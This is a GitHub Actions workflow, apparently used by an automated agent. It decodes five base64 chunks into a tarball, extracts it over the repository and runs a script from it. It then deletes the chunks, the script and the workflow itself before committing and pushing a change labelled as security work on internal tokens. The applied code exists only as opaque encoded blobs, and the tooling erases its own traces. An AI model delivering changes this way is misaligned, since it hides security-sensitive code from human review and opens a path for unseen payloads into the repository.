name: Apply asymmetric token checkpoint

on:
  push:
    branches:
      - agent/asymmetric-internal-token-jwks
  pull_request:
    branches:
      - main

permissions:
  contents: write

concurrency:
  group: apply-asymmetric-token-checkpoint
  cancel-in-progress: false

jobs:
  assemble-verify-commit:
    if: github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: agent/asymmetric-internal-token-jwks
          fetch-depth: 0
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
        with:
          node-version: 22
          package-manager-cache: false
      - name: Assemble checkpoint overlay
        run: |
          python3 - <<'PY'
          import base64
          import hashlib
          import pathlib
          import re

          expected = "c9a75c8592808bffc5c16f590d167352f2db3d1ce20f97235a9a3337c7ab0c3b"
          paths = sorted(pathlib.Path(".checkpoint").glob("asymmetric-overlay-*.b64"))
          if len(paths) != 5:
              raise SystemExit(f"expected 5 checkpoint chunks, found {len(paths)}")

          parts = []
          for path in paths:
              encoded = re.sub(r"[^A-Za-z0-9+/]", "", path.read_text(encoding="utf-8"))
              encoded += "=" * (-len(encoded) % 4)
              parts.append(base64.b64decode(encoded, validate=True))
          payload = b"".join(parts)
          digest = hashlib.sha256(payload).hexdigest()
          print(f"per-chunk checkpoint bytes={len(payload)} sha256={digest}")
          if digest != expected:
              raise SystemExit("checkpoint transport digest mismatch")
          pathlib.Path("/tmp/asymmetric-overlay.tar.gz").write_bytes(payload)
          PY
          echo "c9a75c8592808bffc5c16f590d167352f2db3d1ce20f97235a9a3337c7ab0c3b  /tmp/asymmetric-overlay.tar.gz" | sha256sum --check --strict
          tar --list --gzip --file /tmp/asymmetric-overlay.tar.gz
          tar --extract --gzip --file /tmp/asymmetric-overlay.tar.gz --directory .
          python3 tooling/scripts/apply-asymmetric-checkpoint.py
          rm -rf .checkpoint
          rm -f tooling/scripts/apply-asymmetric-checkpoint.py
          rm -f .github/workflows/apply-asymmetric-checkpoint.yml
      - name: Install exact dependencies
        run: npm ci --ignore-scripts
      - name: Verify focused asymmetric contracts
        run: |
          npm run build
          node --test \
            tests/unit/staging-asymmetric-token.test.mjs \
            tests/unit/staging-asymmetric-deployment.test.mjs \
            tests/unit/staging-internal-token.test.mjs \
            tests/unit/staging-command-token.test.mjs \
            tests/unit/staging-operational-release.test.mjs
      - name: Verify full repository
        run: npm run verify
      - name: Commit verified checkpoint
        run: |
          git diff --check
          git status --short
          git config user.name "Ozzyl Enterprise Agent"
          git config user.email "actions@users.noreply.github.com"
          git add -A
          git commit -m "security: add asymmetric internal token lifecycle"
          git push origin HEAD:agent/asymmetric-internal-token-jwks
